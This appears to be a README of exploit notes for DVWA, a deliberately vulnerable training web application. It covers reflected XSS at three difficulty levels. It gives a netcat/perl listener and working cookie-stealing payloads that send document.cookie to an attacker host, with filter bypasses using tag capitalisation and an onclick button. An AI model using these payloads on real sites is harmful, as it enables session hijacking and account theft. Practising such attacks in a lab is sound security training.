# DVWA_exploits
Here is a list of exploits against DVWA for all levels


# XSS Injection 
Realistic attack : send the cookie of the current user to a web server. We are going to run a server that will listen on port 8000 and will return an empty response.
```
ncat -lkc "perl -e 'while (defined(\$x = <>)){ print STDERR \$x; last if \$x eq qq#\\r\\n
# } print qq#HTTP/1.1 204 No Content\\r\\n#'" 8000

```
This will show in the console the details of the requests. Now we have to call our server and providing in the request some stolen information ( the cookie ).
It would be done with a payload similar to this :
```
<script> window.location="http://10.6.66.64:8000?cookie="+document.cookie</script>
```

## Reflected XSS
### Easy
The first level doesn't contain any filtering, so we can simply write : 
```
<script> window.location="http://10.6.66.64:8000?cookie="+document.cookie</script>
```
in the name field and observe the result on the listener.
### Medium
It filters the `script` strings. We can just replace in our code `script` by `Script` :
```
<Script> window.location="http://10.6.66.64:8000?cookie="+document.cookie</Script>
```
### High
The last one prevent us from using a `script` tag, but we can use another tag, for instance a button with an `onclick` attribute :
```
<button onclick="window.location='http://10.6.66.64:8000?cookie='+document.cookie">exploit</button>
```
